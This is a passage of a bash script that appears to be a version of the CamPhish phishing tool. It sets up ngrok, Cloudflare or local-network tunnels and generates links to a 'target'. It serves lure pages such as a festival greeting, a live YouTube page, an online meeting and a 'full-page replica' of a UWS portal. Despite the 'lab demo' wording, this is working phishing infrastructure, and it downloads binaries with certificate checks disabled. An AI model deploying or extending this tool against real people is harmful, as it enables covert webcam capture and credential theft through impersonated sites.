printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open — closing it stops the tunnel (Error 1033).\e[0m\n"
fi
payload_cloudflare "$link"
checkfound
}

payload_cloudflare() {
link="$1"
payload_site "$link"
}

payload_ngrok() {
link="$1"
payload_site "$link"
}

local_network_server() {
local local_ip link

if ! start_php_server "0.0.0.0"; then
exit 1
fi

local_ip=$(get_local_ip)
if [[ -z "$local_ip" ]]; then
printf "\e[1;31m[!] Could not detect your local IP address.\e[0m\n"
exit 1
fi

link="http://${local_ip}:${CAMPHISH_PORT}"
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
printf "\e[1;93m[\e[0m!\e[1;93m] Local network mode — target must be on the SAME WiFi/LAN as this machine.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Best option for university lab demos when ngrok/cloudflare are blocked.\e[0m\n"
payload_site "$link"
checkfound
}

ngrok_server() {
if [[ -e ngrok ]] && ! ./ngrok version > /dev/null 2>&1; then
rm -f ngrok ngrok.exe
fi
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
start_loader "Downloading Ngrok..."

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            stop_loader
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
stop_loader
fi

local ngrok_bin ngrok_config
if [[ "$windows_mode" == true ]]; then
ngrok_bin="./ngrok.exe"
else
ngrok_bin="./ngrok"
fi
ngrok_config=$(ngrok_config_path)

if ! setup_ngrok_auth "$ngrok_bin"; then
exit 1
fi

if ! start_php_server "127.0.0.1"; then
exit 1
fi

start_ngrok_tunnel "$ngrok_bin" "$ngrok_config"

link=$(wait_for_ngrok_link)
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating.\e[0m\n"
if ! show_ngrok_failure; then
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken may be missing or invalid\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Get a free token: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try option 03 (Local Network) for lab demos\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test:\e[0m\n"
printf "\e[1;77m    php -S 127.0.0.1:%s -t .\e[0m\n" "$CAMPHISH_PORT"
printf "\e[1;77m    %s http %s --config=%s\e[0m\n" "$ngrok_bin" "$CAMPHISH_PORT" "$ngrok_config"
fi
if command -v curl > /dev/null 2>&1; then
printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok API response:\e[0m\n"
curl -s --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null | head -c 800
printf "\n"
fi
show_ngrok_log_summary
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
fi
payload_ngrok "$link"
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Local Network (Lab Demo)\e[0m\n"
default_option_server="3"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 3] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
option_server=$((10#${option_server}))
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
elif [[ $option_server -eq 3 ]]; then
local_network_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi
}

select_template() {
if [ $option_server -gt 3 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m UWS Portal\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
option_tem=$((10#${option_tem}))
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
elif [[ $option_tem -eq 4 ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] UWS Portal template selected (full-page replica)\e[0m\n"
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

banner
dependencies
camphish
